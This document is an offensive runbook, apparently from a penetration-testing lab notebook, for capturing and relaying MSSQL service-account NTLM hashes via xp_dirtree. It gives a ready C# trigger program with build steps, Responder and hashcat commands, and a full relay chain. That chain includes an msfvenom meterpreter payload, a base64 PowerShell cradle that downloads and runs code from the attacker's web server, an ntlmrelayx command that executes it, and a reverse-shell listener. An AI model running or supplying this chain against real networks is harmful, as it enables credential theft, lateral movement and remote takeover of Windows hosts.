# NTLM Hash Capture & Relay via SQL Server (xp_dirtree)

MSSQL servers run as service accounts (often with domain privileges). Forcing them to authenticate to your Kali box via `xp_dirtree` captures the service account's NetNTLMv2 hash. You can then crack it or relay it to gain code execution elsewhere.

**Key constraint:** Cannot relay back to the same host (loop-back). DCs usually have SMB signing — relay to workstations/member servers instead.

---

## Method 1: Hash Capture → Crack

### Step 1: Start Responder

```bash
sudo responder -I tun0
# Listen for incoming SMB auth attempts
```

### Step 2: Trigger UNC Authentication from SQL

**Option A — Direct SQL query (if you have SQL shell access):**
```sql
EXEC master..xp_dirtree "\\192.168.45.X\\test";
-- Alternatives:
EXEC master..xp_fileexist '\\192.168.45.X\share\test.txt';
EXEC master..xp_subdirs '\\192.168.45.X\share';
```

**Option B — C# exe running on a compromised host with Windows Auth to SQL:**

```csharp
using System;
using System.Data.SqlClient;

namespace SQL {
    class Program {
        static void Main(string[] args) {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try {
                con.Open();
                Console.WriteLine("Auth success!");
            } catch {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            // Force SQL Server to authenticate to Kali via SMB:
            String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
```

**Compile (Visual Studio, Windows dev box):**

1. **File → New → Project → Console App (.NET Framework)** (NOT .NET Core)
   - Name: `SQLTrigger`, Framework: **.NET Framework 4.8**
2. Delete defaults, paste in the C# code above
3. Update `sqlServer` to your target and Kali IP (`192.168.119.120`) to your actual IP
4. **Right-click References → Add Reference → Assemblies tab**
   Check **System.Data** → OK
5. **Project → Properties → Build:**
   - Platform target: **x64**
   - (Allow unsafe code is optional — not strictly needed here)
6. **Build → Build Solution** (`Ctrl+Shift+B`)
7. Output: `bin\x64\Debug\SQLTrigger.exe` — copy to target

### Step 3: Capture the Hash

Responder output:
```
[SMB] NTLMv2-SSP Client   : 192.168.50.5
[SMB] NTLMv2-SSP Username : CORP1\sqlsvc
[SMB] NTLMv2-SSP Hash     : sqlsvc::CORP1:2f6c6475053e92cc:56335D1CE7EACE603...
```

### Step 4: Crack with Hashcat

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
# -m 5600 = NetNTLMv2
```

---

## Method 2: NTLM Relay → Code Execution (No Cracking)

Relay the captured hash directly to another target for immediate code execution. This avoids needing to crack the hash.

**Requirements:**
- Target must NOT be the same host as the SQL server (no loopback relay)
- Target must NOT have SMB signing enforced (check with: `nxc smb TARGET --gen-relay-list relay_targets.txt`)

### Full Workflow

**Step 1 — Kali: Prepare payload and web server**
```bash
cd ~/Documents/web
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.186 LPORT=443 -f psh-reflection > run.txt
python3 -m http.server 80
```

**Step 2 — Create Base64 download cradle**
```bash
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\"http://192.168.49.57/run.txt\") | IEX'.encode('utf-16le')).decode())"
# Copy the full base64 string
```

**Step 3 — Kali: Start ntlmrelayx (target = where you want code execution)**
```bash
sudo impacket-ntlmrelayx \
    --no-http-server \
    -smb2support \
    -t 192.168.118.6 \
    -c "powershell -enc <FULL_BASE64_STRING>"

# -t = target to relay TO (not the SQL server)
# -c = command to execute on the target when relay succeeds
```

**Step 4 — Kali: Start MSF listener**
```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.186
set LPORT 443
set ExitOnSession false
exploit -j
```

**Step 5 — Trigger the authentication (from a host with SQL access)**

RDP to `client01` (or any host that can reach the SQL server), then run the C# exe from Step 2 above.

The flow:
```
C# exe → SQL Server (xp_dirtree)
SQL Server → Kali (SMB auth attempt, NetNTLMv2)
ntlmrelayx → Target host (relay the creds)
Target host → executes powershell payload
Meterpreter shell → back to Kali
```

### Troubleshooting

- **Web server on port 80:** Must be running and `run.txt` in the root
- **Base64 string:** If it gets truncated, regenerate — a partial string will fail silently
- **HTTP egress from target:** The relay target needs outbound HTTP/443 to Kali
- **SMB signing on target:** If the relay fails, the target has signing enabled — try another host

---

## Relay vs. Crack Decision

| Situation | Action |
|-----------|--------|
| Hash cracked quickly | Use the plaintext password directly (SSH, RDP, CME) |
| Hash won't crack | Use relay method |
| Relay target = SQL server | Can't relay to same host — must crack or find another target |
| DC is the target | DCs almost always have SMB signing → relay won't work |
| Workstation/member server | Most likely will work for relay |

---

## See Also

- `06-credentials/ntlm-relay/` — ntlmrelayx for LDAP relay, RBCD via relay
- `05-lateral-movement/mssql/RUNBOOK.md` — full SQL attack reference
- `06-credentials/ptx-matrix.md` — using captured hashes for PTH
